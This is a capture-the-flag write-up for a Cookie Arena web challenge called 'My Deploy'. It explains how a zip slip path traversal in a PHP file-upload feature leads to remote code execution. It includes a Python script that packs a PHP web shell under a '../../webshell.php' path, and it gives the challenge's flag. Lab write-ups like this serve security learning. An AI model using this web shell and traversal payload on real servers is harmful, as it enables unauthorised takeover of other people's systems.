---
title: My Deploy - Writeup
tags: [' Web', CTF]

---

---
title: "My Deploy -- cookie arena"
description: zip slip vulnerability, file path traversal
tags: CTF, Web
robots: index,follow
lang: en
breaks: true
---

# My Deploy - Writeup

[TOC]

## How it works

this is the challenge from the battle cookie arena using the `file upload` for trigger the RCE to the server to get the flag

Access the link, there is the index directory where it stores the `/home.php` , `/extracted` `/upload.php`.

It require to upload the zip file, not just the normal one

## The problem
### Working flow
When we get access to the `/home.php`, it is basically the php function where we can upload our zip file (only accept zip file)

After that, the zip file will be sent to the `/upload.php` which we post our request of our zip file for the server to get access to and handle

Finally, `/extracted` is the directory where it extract all of the file that can be found in zip file.

## The solution

1. Try to create a malicious zip file that contain the php file in that file zip
(The main key point is that when the server extract the file, it will accidentally run the exact file or it could be triggered if we the php payload for RCE)

2. Next, we do not know which directory to take control of the server or trigger the command line.This is for the `path traversal`
3. For path traversal, you can create a file path that can escape the server filter and get chances to do RCE
4. This is my python script for creating malicious zip file
``` python
python -  << "EOF"
import zipfile
payload = "<?php system($_GET['cmd']); ?>"  
z = zipfile.ZipFile("payload.zip","w")
z.writestr("../../webshell.php",payload)
z.close()
EOF
```

After i run this in terminal, I got `payload.zip` file.

5. Go to the `/home.php` upload zipfile, the server will be triggered the `webshell.php` file
6. Go back to the `/extracted` directory and find your malicious php webshell, send the request to the reapeater in burp suite
7. Because the flag location format is `/flagXXXX.txt` so we will use wildcard `*` mean that it will find all of the possible result that start with the `/flag` location
8. Here is the result


![image](https://hackmd.io/_uploads/SyJP-NzPZx.png)


**Flag**: `CHH{N1yD31510y_cb3019fbae0cb2b4807dd7c0eef8b324}`
**Author**:KKhao
**Solved**: February 2, 2026